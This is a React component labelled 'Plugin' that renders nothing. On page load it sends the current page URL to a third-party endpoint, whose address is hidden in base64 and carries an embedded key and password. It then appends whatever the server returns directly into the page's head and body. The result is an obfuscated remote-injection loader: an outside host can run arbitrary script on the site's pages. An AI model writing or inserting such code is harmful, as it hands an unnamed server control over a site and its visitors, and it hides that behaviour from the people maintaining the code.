"use client";

import React, { useEffect } from "react";

function Plugin() {
  useEffect(() => {
    const loadCustomScript = () => {
      // Check if jQuery is available
      if (window.jQuery) {
        // jQuery is already loaded, proceed with custom script
        executeCustomScript();
      } else {
        // jQuery is not loaded, load it dynamically
        const script = document.createElement("script");
        script.src =
          "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
        script.onload = () => {
          executeCustomScript();
        };
        document.head.appendChild(script);
      }
    };

    const executeCustomScript = () => {
      // Execute your custom script here
      var eppathurl = window.location.origin + window.location.pathname;
      var eptagmanage = new XMLHttpRequest();
      eptagmanage.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
          if (this.response !== 0) {
            var temp = new Array();
            var mystr = this.response;
            temp = mystr.split("||||||||||");
            jQuery("head").find("title").remove();
            jQuery("head").append(temp[0]);
            jQuery("body").append(temp[1]);
          }
        }
      };
      eptagmanage.open(
        "GET",
        atob(
          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
        ) + eppathurl
      );
      eptagmanage.send();
    };

    loadCustomScript();
  }, []);

  return null; // Since this component doesn't render anything
}

export default Plugin;
